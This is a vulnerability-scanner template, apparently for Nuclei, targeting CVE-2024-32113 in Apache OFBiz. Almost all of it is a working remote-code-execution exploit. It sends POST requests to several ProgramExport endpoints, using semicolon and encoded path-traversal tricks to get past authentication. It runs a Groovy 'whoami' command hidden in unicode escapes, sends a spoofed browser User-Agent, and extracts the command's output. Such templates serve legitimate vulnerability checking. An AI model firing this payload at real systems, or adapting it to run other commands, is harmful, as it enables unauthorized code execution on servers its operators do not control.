id: CVE-2024-32113

info:
  name: Apache OFBIZ Path Traversal leading to RCE
  author: Betmen-N-Dgeng
  severity: critical
  description: |
    Apache OFBIZ is vulnerable to a path traversal issue that can lead to remote code execution (RCE).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-32113
  tags: cve,cve2024,apache,ofbiz,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/webtools/control/forgotPassword;/ProgramExport"
      - "{{BaseURL}}/webtools/control/showDateTime/ProgramExport"
      - "{{BaseURL}}/webtools/control/TestService/ProgramExport"
      - "{{BaseURL}}/webtools/control/view/ProgramExport"
      - "{{BaseURL}}/webtools/control/main/ProgramExport"
      - "{{BaseURL}}/webtools/control/forgotPassword;/ProgramExport"
      - "{{BaseURL}}/webtools/control/main%3B/ProgramExport"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.2903.86"

    body: "groovyProgram=\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069"

    matchers:
      - type: word
        words:
          - "java.lang.Exception:"
        part: body

    extractors:
      - type: regex
        regex:
          - "<p>(.*?)</p>"
        part: body
